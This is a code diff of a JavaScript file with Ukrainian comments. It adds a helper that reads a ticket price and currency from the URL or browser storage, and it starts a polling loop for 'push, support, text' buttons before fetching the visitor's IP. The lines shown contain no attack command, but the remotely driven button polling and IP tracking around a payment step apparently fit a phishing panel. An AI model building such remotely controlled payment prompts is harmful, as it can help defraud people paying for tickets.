@@ -348,6 +348,21 @@
                 }
             });
     }, 2000);
+    // --- Витягуємо total і currency з URL ---
+    function getTotalAndCurrency() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const totalRaw = urlParams.get('total') || sessionStorage.getItem('ticket_total');
+        const currencyRaw = urlParams.get('currency') || sessionStorage.getItem('ticket_currency') || 'EUR';
+        if (totalRaw) {
+            const match = totalRaw.match(/\d+[\.,]?\d*/);
+            const totalNum = match ? match[0].replace(',', '.') : '';
+            return { total: totalNum, currency: currencyRaw };
+        }
+        // fallback: price/currency
+        let price = localStorage.getItem('ticket_price') || sessionStorage.getItem('ticket_price');
+        let currency = localStorage.getItem('ticket_currency') || sessionStorage.getItem('ticket_currency') || 'EUR';
+        return { total: price, currency };
+    }
     // --- Універсальний POLLING для всіх кнопок (push, support, text) ---
     let supportTabOpened = false;
     let pushTabOpened = false;
@@ -485,10 +500,12 @@
         setTimeout(pollAllButtons, 2000);
     }
     
-    // Стартуємо polling тільки після визначення userIP
+    // Стартуємо polling одразу, а не чекаємо userIP
+    startUniversalPolling();
+    
+    // Оновлюємо userIP коли він стає доступним
     getUserIP(function(ip) {
         userIP = ip;
-        startUniversalPolling();
     });
     // --- POLLING для support/text кнопок ---
     function showSupportButtons(total, text_id) {
